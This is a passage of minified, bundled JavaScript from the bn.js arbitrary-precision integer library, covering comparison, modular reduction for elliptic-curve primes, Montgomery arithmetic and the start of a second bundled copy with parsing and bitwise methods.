                    for (var de = 0, re = 1; (L.words[0] & re) === 0 && de < 26; ++de,
                    re <<= 1)
                        ;
                    if (de > 0)
                        for (L.iushrn(de); de-- > 0; )
                            Z.isOdd() && Z.iadd(se),
                            Z.iushrn(1);
                    for (var $ = 0, ie = 1; (U.words[0] & ie) === 0 && $ < 26; ++$,
                    ie <<= 1)
                        ;
                    if ($ > 0)
                        for (U.iushrn($); $-- > 0; )
                            te.isOdd() && te.iadd(se),
                            te.iushrn(1);
                    L.cmp(U) >= 0 ? (L.isub(U),
                    Z.isub(te)) : (U.isub(L),
                    te.isub(Z))
                }
                var ve;
                return L.cmpn(1) === 0 ? ve = Z : ve = te,
                ve.cmpn(0) < 0 && ve.iadd(q),
                ve
            }
            ,
            w.prototype.gcd = function(q) {
                if (this.isZero())
                    return q.abs();
                if (q.isZero())
                    return this.abs();
                var L = this.clone()
                  , U = q.clone();
                L.negative = 0,
                U.negative = 0;
                for (var Z = 0; L.isEven() && U.isEven(); Z++)
                    L.iushrn(1),
                    U.iushrn(1);
                do {
                    for (; L.isEven(); )
                        L.iushrn(1);
                    for (; U.isEven(); )
                        U.iushrn(1);
                    var te = L.cmp(U);
                    if (te < 0) {
                        var se = L;
                        L = U,
                        U = se
                    } else if (te === 0 || U.cmpn(1) === 0)
                        break;
                    L.isub(U)
                } while (!0);
                return U.iushln(Z)
            }
            ,
            w.prototype.invm = function(q) {
                return this.egcd(q).a.umod(q)
            }
            ,
            w.prototype.isEven = function() {
                return (this.words[0] & 1) === 0
            }
            ,
            w.prototype.isOdd = function() {
                return (this.words[0] & 1) === 1
            }
            ,
            w.prototype.andln = function(q) {
                return this.words[0] & q
            }
            ,
            w.prototype.bincn = function(q) {
                O(typeof q == "number");
                var L = q % 26
                  , U = (q - L) / 26
                  , Z = 1 << L;
                if (this.length <= U)
                    return this._expand(U + 1),
                    this.words[U] |= Z,
                    this;
                for (var te = Z, se = U; te !== 0 && se < this.length; se++) {
                    var de = this.words[se] | 0;
                    de += te,
                    te = de >>> 26,
                    de &= 67108863,
                    this.words[se] = de
                }
                return te !== 0 && (this.words[se] = te,
                this.length++),
                this
            }
            ,
            w.prototype.isZero = function() {
                return this.length === 1 && this.words[0] === 0
            }
            ,
            w.prototype.cmpn = function(q) {
                var L = q < 0;
                if (this.negative !== 0 && !L)
                    return -1;
                if (this.negative === 0 && L)
                    return 1;
                this.strip();
                var U;
                if (this.length > 1)
                    U = 1;
                else {
                    L && (q = -q),
                    O(q <= 67108863, "Number is too big");
                    var Z = this.words[0] | 0;
                    U = Z === q ? 0 : Z < q ? -1 : 1
                }
                return this.negative !== 0 ? -U | 0 : U
            }
            ,
            w.prototype.cmp = function(q) {
                if (this.negative !== 0 && q.negative === 0)
                    return -1;
                if (this.negative === 0 && q.negative !== 0)
                    return 1;
                var L = this.ucmp(q);
                return this.negative !== 0 ? -L | 0 : L
            }
            ,
            w.prototype.ucmp = function(q) {
                if (this.length > q.length)
                    return 1;
                if (this.length < q.length)
                    return -1;
                for (var L = 0, U = this.length - 1; U >= 0; U--) {
                    var Z = this.words[U] | 0
                      , te = q.words[U] | 0;
                    if (Z !== te) {
                        Z < te ? L = -1 : Z > te && (L = 1);
                        break
                    }
                }
                return L
            }
            ,
            w.prototype.gtn = function(q) {
                return this.cmpn(q) === 1
            }
            ,
            w.prototype.gt = function(q) {
                return this.cmp(q) === 1
            }
            ,
            w.prototype.gten = function(q) {
                return this.cmpn(q) >= 0
            }
            ,
            w.prototype.gte = function(q) {
                return this.cmp(q) >= 0
            }
            ,
            w.prototype.ltn = function(q) {
                return this.cmpn(q) === -1
            }
            ,
            w.prototype.lt = function(q) {
                return this.cmp(q) === -1
            }
            ,
            w.prototype.lten = function(q) {
                return this.cmpn(q) <= 0
            }
            ,
            w.prototype.lte = function(q) {
                return this.cmp(q) <= 0
            }
            ,
            w.prototype.eqn = function(q) {
                return this.cmpn(q) === 0
            }
            ,
            w.prototype.eq = function(q) {
                return this.cmp(q) === 0
            }
            ,
            w.red = function(q) {
                return new Ee(q)
            }
            ,
            w.prototype.toRed = function(q) {
                return O(!this.red, "Already a number in reduction context"),
                O(this.negative === 0, "red works only with positives"),
                q.convertTo(this)._forceRed(q)
            }
            ,
            w.prototype.fromRed = function() {
                return O(this.red, "fromRed works only with numbers in reduction context"),
                this.red.convertFrom(this)
            }
            ,
            w.prototype._forceRed = function(q) {
                return this.red = q,
                this
            }
            ,
            w.prototype.forceRed = function(q) {
                return O(!this.red, "Already a number in reduction context"),
                this._forceRed(q)
            }
            ,
            w.prototype.redAdd = function(q) {
                return O(this.red, "redAdd works only with red numbers"),
                this.red.add(this, q)
            }
            ,
            w.prototype.redIAdd = function(q) {
                return O(this.red, "redIAdd works only with red numbers"),
                this.red.iadd(this, q)
            }
            ,
            w.prototype.redSub = function(q) {
                return O(this.red, "redSub works only with red numbers"),
                this.red.sub(this, q)
            }
            ,
            w.prototype.redISub = function(q) {
                return O(this.red, "redISub works only with red numbers"),
                this.red.isub(this, q)
            }
            ,
            w.prototype.redShl = function(q) {
                return O(this.red, "redShl works only with red numbers"),
                this.red.shl(this, q)
            }
            ,
            w.prototype.redMul = function(q) {
                return O(this.red, "redMul works only with red numbers"),
                this.red._verify2(this, q),
                this.red.mul(this, q)
            }
            ,
            w.prototype.redIMul = function(q) {
                return O(this.red, "redMul works only with red numbers"),
                this.red._verify2(this, q),
                this.red.imul(this, q)
            }
            ,
            w.prototype.redSqr = function() {
                return O(this.red, "redSqr works only with red numbers"),
                this.red._verify1(this),
                this.red.sqr(this)
            }
            ,
            w.prototype.redISqr = function() {
                return O(this.red, "redISqr works only with red numbers"),
                this.red._verify1(this),
                this.red.isqr(this)
            }
            ,
            w.prototype.redSqrt = function() {
                return O(this.red, "redSqrt works only with red numbers"),
                this.red._verify1(this),
                this.red.sqrt(this)
            }
            ,
            w.prototype.redInvm = function() {
                return O(this.red, "redInvm works only with red numbers"),
                this.red._verify1(this),
                this.red.invm(this)
            }
            ,
            w.prototype.redNeg = function() {
                return O(this.red, "redNeg works only with red numbers"),
                this.red._verify1(this),
                this.red.neg(this)
            }
            ,
            w.prototype.redPow = function(q) {
                return O(this.red && !q.red, "redPow(normalNum)"),
                this.red._verify1(this),
                this.red.pow(this, q)
            }
            ;
            var he = {
                k256: null,
                p224: null,
                p192: null,
                p25519: null
            };
            function pe(ce, q) {
                this.name = ce,
                this.p = new w(q,16),
                this.n = this.p.bitLength(),
                this.k = new w(1).iushln(this.n).isub(this.p),
                this.tmp = this._tmp()
            }
            pe.prototype._tmp = function() {
                var q = new w(null);
                return q.words = new Array(Math.ceil(this.n / 13)),
                q
            }
            ,
            pe.prototype.ireduce = function(q) {
                var L = q, U;
                do
                    this.split(L, this.tmp),
                    L = this.imulK(L),
                    L = L.iadd(this.tmp),
                    U = L.bitLength();
                while (U > this.n);
                var Z = U < this.n ? -1 : L.ucmp(this.p);
                return Z === 0 ? (L.words[0] = 0,
                L.length = 1) : Z > 0 ? L.isub(this.p) : L.strip !== void 0 ? L.strip() : L._strip(),
                L
            }
            ,
            pe.prototype.split = function(q, L) {
                q.iushrn(this.n, 0, L)
            }
            ,
            pe.prototype.imulK = function(q) {
                return q.imul(this.k)
            }
            ;
            function ye() {
                pe.call(this, "k256", "ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe fffffc2f")
            }
            x(ye, pe),
            ye.prototype.split = function(q, L) {
                for (var U = 4194303, Z = Math.min(q.length, 9), te = 0; te < Z; te++)
                    L.words[te] = q.words[te];
                if (L.length = Z,
                q.length <= 9) {
                    q.words[0] = 0,
                    q.length = 1;
                    return
                }
                var se = q.words[9];
                for (L.words[L.length++] = se & U,
                te = 10; te < q.length; te++) {
                    var de = q.words[te] | 0;
                    q.words[te - 10] = (de & U) << 4 | se >>> 22,
                    se = de
                }
                se >>>= 22,
                q.words[te - 10] = se,
                se === 0 && q.length > 10 ? q.length -= 10 : q.length -= 9
            }
            ,
            ye.prototype.imulK = function(q) {
                q.words[q.length] = 0,
                q.words[q.length + 1] = 0,
                q.length += 2;
                for (var L = 0, U = 0; U < q.length; U++) {
                    var Z = q.words[U] | 0;
                    L += Z * 977,
                    q.words[U] = L & 67108863,
                    L = Z * 64 + (L / 67108864 | 0)
                }
                return q.words[q.length - 1] === 0 && (q.length--,
                q.words[q.length - 1] === 0 && q.length--),
                q
            }
            ;
            function be() {
                pe.call(this, "p224", "ffffffff ffffffff ffffffff ffffffff 00000000 00000000 00000001")
            }
            x(be, pe);
            function xe() {
                pe.call(this, "p192", "ffffffff ffffffff ffffffff fffffffe ffffffff ffffffff")
            }
            x(xe, pe);
            function Ae() {
                pe.call(this, "25519", "7fffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffed")
            }
            x(Ae, pe),
            Ae.prototype.imulK = function(q) {
                for (var L = 0, U = 0; U < q.length; U++) {
                    var Z = (q.words[U] | 0) * 19 + L
                      , te = Z & 67108863;
                    Z >>>= 26,
                    q.words[U] = te,
                    L = Z
                }
                return L !== 0 && (q.words[q.length++] = L),
                q
            }
            ,
            w._prime = function(q) {
                if (he[q])
                    return he[q];
                var L;
                if (q === "k256")
                    L = new ye;
                else if (q === "p224")
                    L = new be;
                else if (q === "p192")
                    L = new xe;
                else if (q === "p25519")
                    L = new Ae;
                else
                    throw new Error("Unknown prime " + q);
                return he[q] = L,
                L
            }
            ;
            function Ee(ce) {
                if (typeof ce == "string") {
                    var q = w._prime(ce);
                    this.m = q.p,
                    this.prime = q
                } else
                    O(ce.gtn(1), "modulus must be greater than 1"),
                    this.m = ce,
                    this.prime = null
            }
            Ee.prototype._verify1 = function(q) {
                O(q.negative === 0, "red works only with positives"),
                O(q.red, "red works only with red numbers")
            }
            ,
            Ee.prototype._verify2 = function(q, L) {
                O((q.negative | L.negative) === 0, "red works only with positives"),
                O(q.red && q.red === L.red, "red works only with red numbers")
            }
            ,
            Ee.prototype.imod = function(q) {
                return this.prime ? this.prime.ireduce(q)._forceRed(this) : q.umod(this.m)._forceRed(this)
            }
            ,
            Ee.prototype.neg = function(q) {
                return q.isZero() ? q.clone() : this.m.sub(q)._forceRed(this)
            }
            ,
            Ee.prototype.add = function(q, L) {
                this._verify2(q, L);
                var U = q.add(L);
                return U.cmp(this.m) >= 0 && U.isub(this.m),
                U._forceRed(this)
            }
            ,
            Ee.prototype.iadd = function(q, L) {
                this._verify2(q, L);
                var U = q.iadd(L);
                return U.cmp(this.m) >= 0 && U.isub(this.m),
                U
            }
            ,
            Ee.prototype.sub = function(q, L) {
                this._verify2(q, L);
                var U = q.sub(L);
                return U.cmpn(0) < 0 && U.iadd(this.m),
                U._forceRed(this)
            }
            ,
            Ee.prototype.isub = function(q, L) {
                this._verify2(q, L);
                var U = q.isub(L);
                return U.cmpn(0) < 0 && U.iadd(this.m),
                U
            }
            ,
            Ee.prototype.shl = function(q, L) {
                return this._verify1(q),
                this.imod(q.ushln(L))
            }
            ,
            Ee.prototype.imul = function(q, L) {
                return this._verify2(q, L),
                this.imod(q.imul(L))
            }
            ,
            Ee.prototype.mul = function(q, L) {
                return this._verify2(q, L),
                this.imod(q.mul(L))
            }
            ,
            Ee.prototype.isqr = function(q) {
                return this.imul(q, q.clone())
            }
            ,
            Ee.prototype.sqr = function(q) {
                return this.mul(q, q)
            }
            ,
            Ee.prototype.sqrt = function(q) {
                if (q.isZero())
                    return q.clone();
                var L = this.m.andln(3);
                if (O(L % 2 === 1),
                L === 3) {
                    var U = this.m.add(new w(1)).iushrn(2);
                    return this.pow(q, U)
                }
                for (var Z = this.m.subn(1), te = 0; !Z.isZero() && Z.andln(1) === 0; )
                    te++,
                    Z.iushrn(1);
                O(!Z.isZero());
                var se = new w(1).toRed(this)
                  , de = se.redNeg()
                  , re = this.m.subn(1).iushrn(1)
                  , $ = this.m.bitLength();
                for ($ = new w(2 * $ * $).toRed(this); this.pow($, re).cmp(de) !== 0; )
                    $.redIAdd(de);
                for (var ie = this.pow($, Z), ve = this.pow(q, Z.addn(1).iushrn(1)), ge = this.pow(q, Z), Re = te; ge.cmp(se) !== 0; ) {
                    for (var Pe = ge, Ie = 0; Pe.cmp(se) !== 0; Ie++)
                        Pe = Pe.redSqr();
                    O(Ie < Re);
                    var Te = this.pow(ie, new w(1).iushln(Re - Ie - 1));
                    ve = ve.redMul(Te),
                    ie = Te.redSqr(),
                    ge = ge.redMul(ie),
                    Re = Ie
                }
                return ve
            }
            ,
            Ee.prototype.invm = function(q) {
                var L = q._invmp(this.m);
                return L.negative !== 0 ? (L.negative = 0,
                this.imod(L).redNeg()) : this.imod(L)
            }
            ,
            Ee.prototype.pow = function(q, L) {
                if (L.isZero())
                    return new w(1).toRed(this);
                if (L.cmpn(1) === 0)
                    return q.clone();
                var U = 4
                  , Z = new Array(1 << U);
                Z[0] = new w(1).toRed(this),
                Z[1] = q;
                for (var te = 2; te < Z.length; te++)
                    Z[te] = this.mul(Z[te - 1], q);
                var se = Z[0]
                  , de = 0
                  , re = 0
                  , $ = L.bitLength() % 26;
                for ($ === 0 && ($ = 26),
                te = L.length - 1; te >= 0; te--) {
                    for (var ie = L.words[te], ve = $ - 1; ve >= 0; ve--) {
                        var ge = ie >> ve & 1;
                        if (se !== Z[0] && (se = this.sqr(se)),
                        ge === 0 && de === 0) {
                            re = 0;
                            continue
                        }
                        de <<= 1,
                        de |= ge,
                        re++,
                        !(re !== U && (te !== 0 || ve !== 0)) && (se = this.mul(se, Z[de]),
                        re = 0,
                        de = 0)
                    }
                    $ = 26
                }
                return se
            }
            ,
            Ee.prototype.convertTo = function(q) {
                var L = q.umod(this.m);
                return L === q ? L.clone() : L
            }
            ,
            Ee.prototype.convertFrom = function(q) {
                var L = q.clone();
                return L.red = null,
                L
            }
            ,
            w.mont = function(q) {
                return new Be(q)
            }
            ;
            function Be(ce) {
                Ee.call(this, ce),
                this.shift = this.m.bitLength(),
                this.shift % 26 !== 0 && (this.shift += 26 - this.shift % 26),
                this.r = new w(1).iushln(this.shift),
                this.r2 = this.imod(this.r.sqr()),
                this.rinv = this.r._invmp(this.m),
                this.minv = this.rinv.mul(this.r).isubn(1).div(this.m),
                this.minv = this.minv.umod(this.r),
                this.minv = this.r.sub(this.minv)
            }
            x(Be, Ee),
            Be.prototype.convertTo = function(q) {
                return this.imod(q.ushln(this.shift))
            }
            ,
            Be.prototype.convertFrom = function(q) {
                var L = this.imod(q.mul(this.rinv));
                return L.red = null,
                L
            }
            ,
            Be.prototype.imul = function(q, L) {
                if (q.isZero() || L.isZero())
                    return q.words[0] = 0,
                    q.length = 1,
                    q;
                var U = q.imul(L)
                  , Z = U.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m)
                  , te = U.isub(Z).iushrn(this.shift)
                  , se = te;
                return te.cmp(this.m) >= 0 ? se = te.isub(this.m) : te.cmpn(0) < 0 && (se = te.iadd(this.m)),
                se._forceRed(this)
            }
            ,
            Be.prototype.mul = function(q, L) {
                if (q.isZero() || L.isZero())
                    return new w(0)._forceRed(this);
                var U = q.mul(L)
                  , Z = U.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m)
                  , te = U.isub(Z).iushrn(this.shift)
                  , se = te;
                return te.cmp(this.m) >= 0 ? se = te.isub(this.m) : te.cmpn(0) < 0 && (se = te.iadd(this.m)),
                se._forceRed(this)
            }
            ,
            Be.prototype.invm = function(q) {
                var L = this.imod(q._invmp(this.m).mul(this.r2));
                return L._forceRed(this)
            }
        }
        )(_, bn$c)
    }(bn$d)),
    bn$d.exports
}
var bn$b = {
    exports: {}
}, bn$a = bn$b.exports, hasRequiredBn$5;
function requireBn$5() {
    return hasRequiredBn$5 || (hasRequiredBn$5 = 1,
    function(_) {
        (function(M, j) {
            function O(ce, q) {
                if (!ce)
                    throw new Error(q || "Assertion failed")
            }
            function x(ce, q) {
                ce.super_ = q;
                var L = function() {};
                L.prototype = q.prototype,
                ce.prototype = new L,
                ce.prototype.constructor = ce
            }
            function w(ce, q, L) {
                if (w.isBN(ce))
                    return ce;
                this.negative = 0,
                this.words = null,
                this.length = 0,
                this.red = null,
                ce !== null && ((q === "le" || q === "be") && (L = q,
                q = 10),
                this._init(ce || 0, q || 10, L || "be"))
            }
            typeof M == "object" ? M.exports = w : j.BN = w,
            w.BN = w,
            w.wordSize = 26;
            var b;
            try {
                typeof window < "u" && typeof window.Buffer < "u" ? b = window.Buffer : b = requireDist$4().Buffer
            } catch {}
            w.isBN = function(q) {
                return q instanceof w ? !0 : q !== null && typeof q == "object" && q.constructor.wordSize === w.wordSize && Array.isArray(q.words)
            }
            ,
            w.max = function(q, L) {
                return q.cmp(L) > 0 ? q : L
            }
            ,
            w.min = function(q, L) {
                return q.cmp(L) < 0 ? q : L
            }
            ,
            w.prototype._init = function(q, L, U) {
                if (typeof q == "number")
                    return this._initNumber(q, L, U);
                if (typeof q == "object")
                    return this._initArray(q, L, U);
                L === "hex" && (L = 16),
                O(L === (L | 0) && L >= 2 && L <= 36),
                q = q.toString().replace(/\s+/g, "");
                var Z = 0;
                q[0] === "-" && (Z++,
                this.negative = 1),
                Z < q.length && (L === 16 ? this._parseHex(q, Z, U) : (this._parseBase(q, L, Z),
                U === "le" && this._initArray(this.toArray(), L, U)))
            }
            ,
            w.prototype._initNumber = function(q, L, U) {
                q < 0 && (this.negative = 1,
                q = -q),
                q < 67108864 ? (this.words = [q & 67108863],
                this.length = 1) : q < 4503599627370496 ? (this.words = [q & 67108863, q / 67108864 & 67108863],
                this.length = 2) : (O(q < 9007199254740992),
                this.words = [q & 67108863, q / 67108864 & 67108863, 1],
                this.length = 3),
                U === "le" && this._initArray(this.toArray(), L, U)
            }
            ,
            w.prototype._initArray = function(q, L, U) {
                if (O(typeof q.length == "number"),
                q.length <= 0)
                    return this.words = [0],
                    this.length = 1,
                    this;
                this.length = Math.ceil(q.length / 3),
                this.words = new Array(this.length);
                for (var Z = 0; Z < this.length; Z++)
                    this.words[Z] = 0;
                var te, se, de = 0;
                if (U === "be")
                    for (Z = q.length - 1,
                    te = 0; Z >= 0; Z -= 3)
                        se = q[Z] | q[Z - 1] << 8 | q[Z - 2] << 16,
                        this.words[te] |= se << de & 67108863,
                        this.words[te + 1] = se >>> 26 - de & 67108863,
                        de += 24,
                        de >= 26 && (de -= 26,
                        te++);
                else if (U === "le")
                    for (Z = 0,
                    te = 0; Z < q.length; Z += 3)
                        se = q[Z] | q[Z + 1] << 8 | q[Z + 2] << 16,
                        this.words[te] |= se << de & 67108863,
                        this.words[te + 1] = se >>> 26 - de & 67108863,
                        de += 24,
                        de >= 26 && (de -= 26,
                        te++);
                return this.strip()
            }
            ;
            function X(ce, q) {
                var L = ce.charCodeAt(q);
                return L >= 65 && L <= 70 ? L - 55 : L >= 97 && L <= 102 ? L - 87 : L - 48 & 15
            }
            function Y(ce, q, L) {
                var U = X(ce, L);
                return L - 1 >= q && (U |= X(ce, L - 1) << 4),
                U
            }
            w.prototype._parseHex = function(q, L, U) {
                this.length = Math.ceil((q.length - L) / 6),
                this.words = new Array(this.length);
                for (var Z = 0; Z < this.length; Z++)
                    this.words[Z] = 0;
                var te = 0, se = 0, de;
                if (U === "be")
                    for (Z = q.length - 1; Z >= L; Z -= 2)
                        de = Y(q, L, Z) << te,
                        this.words[se] |= de & 67108863,
                        te >= 18 ? (te -= 18,
                        se += 1,
                        this.words[se] |= de >>> 26) : te += 8;
                else {
                    var re = q.length - L;
                    for (Z = re % 2 === 0 ? L + 1 : L; Z < q.length; Z += 2)
                        de = Y(q, L, Z) << te,
                        this.words[se] |= de & 67108863,
                        te >= 18 ? (te -= 18,
                        se += 1,
                        this.words[se] |= de >>> 26) : te += 8
                }
                this.strip()
            }
            ;
            function F(ce, q, L, U) {
                for (var Z = 0, te = Math.min(ce.length, L), se = q; se < te; se++) {
                    var de = ce.charCodeAt(se) - 48;
                    Z *= U,
                    de >= 49 ? Z += de - 49 + 10 : de >= 17 ? Z += de - 17 + 10 : Z += de
                }
                return Z
            }
            w.prototype._parseBase = function(q, L, U) {
                this.words = [0],
                this.length = 1;
                for (var Z = 0, te = 1; te <= 67108863; te *= L)
                    Z++;
                Z--,
                te = te / L | 0;
                for (var se = q.length - U, de = se % Z, re = Math.min(se, se - de) + U, $ = 0, ie = U; ie < re; ie += Z)
                    $ = F(q, ie, ie + Z, L),
                    this.imuln(te),
                    this.words[0] + $ < 67108864 ? this.words[0] += $ : this._iaddn($);
                if (de !== 0) {
                    var ve = 1;
                    for ($ = F(q, ie, q.length, L),
                    ie = 0; ie < de; ie++)
                        ve *= L;
                    this.imuln(ve),
                    this.words[0] + $ < 67108864 ? this.words[0] += $ : this._iaddn($)
                }
                this.strip()
            }
            ,
            w.prototype.copy = function(q) {
                q.words = new Array(this.length);
                for (var L = 0; L < this.length; L++)
                    q.words[L] = this.words[L];
                q.length = this.length,
                q.negative = this.negative,
                q.red = this.red
            }
            ,
            w.prototype.clone = function() {
                var q = new w(null);
                return this.copy(q),
                q
            }
            ,
            w.prototype._expand = function(q) {
                for (; this.length < q; )
                    this.words[this.length++] = 0;
                return this
            }
            ,
            w.prototype.strip = function() {
                for (; this.length > 1 && this.words[this.length - 1] === 0; )
                    this.length--;
                return this._normSign()
            }
            ,
            w.prototype._normSign = function() {
                return this.length === 1 && this.words[0] === 0 && (this.negative = 0),
                this
            }
            ,
            w.prototype.inspect = function() {
                return (this.red ? "<BN-R: " : "<BN: ") + this.toString(16) + ">"
            }
            ;
            var V = ["", "0", "00", "000", "0000", "00000", "000000", "0000000", "00000000", "000000000", "0000000000", "00000000000", "000000000000", "0000000000000", "00000000000000", "000000000000000", "0000000000000000", "00000000000000000", "000000000000000000", "0000000000000000000", "00000000000000000000", "000000000000000000000", "0000000000000000000000", "00000000000000000000000", "000000000000000000000000", "0000000000000000000000000"]
              , K = [0, 0, 25, 16, 12, 11, 10, 9, 8, 8, 7, 7, 7, 7, 6, 6, 6, 6, 6, 6, 6, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5]
              , Q = [0, 0, 33554432, 43046721, 16777216, 48828125, 60466176, 40353607, 16777216, 43046721, 1e7, 19487171, 35831808, 62748517, 7529536, 11390625, 16777216, 24137569, 34012224, 47045881, 64e6, 4084101, 5153632, 6436343, 7962624, 9765625, 11881376, 14348907, 17210368, 20511149, 243e5, 28629151, 33554432, 39135393, 45435424, 52521875, 60466176];
            w.prototype.toString = function(q, L) {
                q = q || 10,
                L = L | 0 || 1;
                var U;
                if (q === 16 || q === "hex") {
                    U = "";
                    for (var Z = 0, te = 0, se = 0; se < this.length; se++) {
                        var de = this.words[se]
                          , re = ((de << Z | te) & 16777215).toString(16);
                        te = de >>> 24 - Z & 16777215,
                        Z += 2,
                        Z >= 26 && (Z -= 26,
                        se--),
                        te !== 0 || se !== this.length - 1 ? U = V[6 - re.length] + re + U : U = re + U
                    }
                    for (te !== 0 && (U = te.toString(16) + U); U.length % L !== 0; )
                        U = "0" + U;
                    return this.negative !== 0 && (U = "-" + U),
                    U
                }
                if (q === (q | 0) && q >= 2 && q <= 36) {
                    var $ = K[q]
                      , ie = Q[q];
                    U = "";
                    var ve = this.clone();
                    for (ve.negative = 0; !ve.isZero(); ) {
                        var ge = ve.modn(ie).toString(q);
                        ve = ve.idivn(ie),
                        ve.isZero() ? U = ge + U : U = V[$ - ge.length] + ge + U
                    }
                    for (this.isZero() && (U = "0" + U); U.length % L !== 0; )
                        U = "0" + U;
                    return this.negative !== 0 && (U = "-" + U),
                    U
                }
                O(!1, "Base should be between 2 and 36")
            }
            ,
            w.prototype.toNumber = function() {
                var q = this.words[0];
                return this.length === 2 ? q += this.words[1] * 67108864 : this.length === 3 && this.words[2] === 1 ? q += 4503599627370496 + this.words[1] * 67108864 : this.length > 2 && O(!1, "Number can only safely store up to 53 bits"),
                this.negative !== 0 ? -q : q
            }
            ,
            w.prototype.toJSON = function() {
                return this.toString(16)
            }
            ,
            w.prototype.toBuffer = function(q, L) {
                return O(typeof b < "u"),
                this.toArrayLike(b, q, L)
            }
            ,
            w.prototype.toArray = function(q, L) {
                return this.toArrayLike(Array, q, L)
            }
            ,
            w.prototype.toArrayLike = function(q, L, U) {
                var Z = this.byteLength()
                  , te = U || Math.max(1, Z);
                O(Z <= te, "byte array longer than desired length"),
                O(te > 0, "Requested array length <= 0"),
                this.strip();
                var se = L === "le", de = new q(te), re, $, ie = this.clone();
                if (se) {
                    for ($ = 0; !ie.isZero(); $++)
                        re = ie.andln(255),
                        ie.iushrn(8),
                        de[$] = re;
                    for (; $ < te; $++)
                        de[$] = 0
                } else {
                    for ($ = 0; $ < te - Z; $++)
                        de[$] = 0;
                    for ($ = 0; !ie.isZero(); $++)
                        re = ie.andln(255),
                        ie.iushrn(8),
                        de[te - $ - 1] = re
                }
                return de
            }
            ,
            Math.clz32 ? w.prototype._countBits = function(q) {
                return 32 - Math.clz32(q)
            }
            : w.prototype._countBits = function(q) {
                var L = q
                  , U = 0;
                return L >= 4096 && (U += 13,
                L >>>= 13),
                L >= 64 && (U += 7,
                L >>>= 7),
                L >= 8 && (U += 4,
                L >>>= 4),
                L >= 2 && (U += 2,
                L >>>= 2),
                U + L
            }
            ,
            w.prototype._zeroBits = function(q) {
                if (q === 0)
                    return 26;
                var L = q
                  , U = 0;
                return (L & 8191) === 0 && (U += 13,
                L >>>= 13),
                (L & 127) === 0 && (U += 7,
                L >>>= 7),
                (L & 15) === 0 && (U += 4,
                L >>>= 4),
                (L & 3) === 0 && (U += 2,
                L >>>= 2),
                (L & 1) === 0 && U++,
                U
            }
            ,
            w.prototype.bitLength = function() {
                var q = this.words[this.length - 1]
                  , L = this._countBits(q);
                return (this.length - 1) * 26 + L
            }
            ;
            function ee(ce) {
                for (var q = new Array(ce.bitLength()), L = 0; L < q.length; L++) {
                    var U = L / 26 | 0
                      , Z = L % 26;
                    q[L] = (ce.words[U] & 1 << Z) >>> Z
                }
                return q
            }
            w.prototype.zeroBits = function() {
                if (this.isZero())
                    return 0;
                for (var q = 0, L = 0; L < this.length; L++) {
                    var U = this._zeroBits(this.words[L]);
                    if (q += U,
                    U !== 26)
                        break
                }
                return q
            }
            ,
            w.prototype.byteLength = function() {
                return Math.ceil(this.bitLength() / 8)
            }
            ,
            w.prototype.toTwos = function(q) {
                return this.negative !== 0 ? this.abs().inotn(q).iaddn(1) : this.clone()
            }
            ,
            w.prototype.fromTwos = function(q) {
                return this.testn(q - 1) ? this.notn(q).iaddn(1).ineg() : this.clone()
            }
            ,
            w.prototype.isNeg = function() {
                return this.negative !== 0
            }
            ,
            w.prototype.neg = function() {
                return this.clone().ineg()
            }
            ,
            w.prototype.ineg = function() {
                return this.isZero() || (this.negative ^= 1),
                this
            }
            ,
            w.prototype.iuor = function(q) {
                for (; this.length < q.length; )
                    this.words[this.length++] = 0;
                for (var L = 0; L < q.length; L++)
                    this.words[L] = this.words[L] | q.words[L];
                return this.strip()
            }
            ,
            w.prototype.ior = function(q) {
                return O((this.negative | q.negative) === 0),
                this.iuor(q)
            }
            ,
            w.prototype.or = function(q) {
                return this.length > q.length ? this.clone().ior(q) : q.clone().ior(this)
            }
            ,
            w.prototype.uor = function(q) {
                return this.length > q.length ? this.clone().iuor(q) : q.clone().iuor(this)
            }
            ,
            w.prototype.iuand = function(q) {
                var L;
                this.length > q.length ? L = q : L = this;
                for (var U = 0; U < L.length; U++)
                    this.words[U] = this.words[U] & q.words[U];
                return this.length = L.length,
                this.strip()
            }
            ,
            w.prototype.iand = function(q) {
                return O((this.negative | q.negative) === 0),
                this.iuand(q)
            }
            ,
            w.prototype.and = function(q) {
                return this.length > q.length ? this.clone().iand(q) : q.clone().iand(this)
            }
            ,
            w.prototype.uand = function(q) {
                return this.length > q.length ? this.clone().iuand(q) : q.clone().iuand(this)
            }
            ,
            w.prototype.iuxor = function(q) {
                var L, U;
                this.length > q.length ? (L = this,
                U = q) : (L = q,
                U = this);
                for (var Z = 0; Z < U.length; Z++)
                    this.words[Z] = L.words[Z] ^ U.words[Z];
                if (this !== L)
                    for (; Z < L.length; Z++)
                        this.words[Z] = L.words[Z];
                return this.length = L.length,
                this.strip()
            }
            ,
            w.prototype.ixor = function(q) {
                return O((this.negative | q.negative) === 0),
                this.iuxor(q)
            }
            ,
            w.prototype.xor = function(q) {
                return this.length > q.length ? this.clone().ixor(q) : q.clone().ixor(this)
            }
            ,
            w.prototype.uxor = function(q) {
                return this.length > q.length ? this.clone().iuxor(q) : q.clone().iuxor(this)
            }
            ,
            w.prototype.inotn = function(q) {
                O(typeof q == "number" && q >= 0);
                var L = Math.ceil(q / 26) | 0
                  , U = q % 26;
                this._expand(L),
                U > 0 && L--;
                for (var Z = 0; Z < L; Z++)
                    this.words[Z] = ~this.words[Z] & 67108863;
                return U > 0 && (this.words[Z] = ~this.words[Z] & 67108863 >> 26 - U),
                this.strip()
            }
            ,
            w.prototype.notn = function(q) {
                return this.clone().inotn(q)
            }
            ,
            w.prototype.setn = function(q, L) {
                O(typeof q == "number" && q >= 0);
                var U = q / 26 | 0
                  , Z = q % 26;
                return this._expand(U + 1),
                L ? this.words[U] = this.words[U] | 1 << Z : this.words[U] = this.words[U] & ~(1 << Z),
                this.strip()
            }
            ,
            w.prototype.iadd = function(q) {
                var L;
                if (this.negative !== 0 && q.negative === 0)
                    return this.negative = 0,
                    L = this.isub(q),
                    this.negative ^= 1,
                    this._normSign();
                if (this.negative === 0 && q.negative !== 0)
                    return q.negative = 0,
                    L = this.isub(q),
                    q.negative = 1,
                    L._normSign();
                var U, Z;
                this.length > q.length ? (U = this,
                Z = q) : (U = q,
                Z = this);
                for (var te = 0, se = 0; se < Z.length; se++)
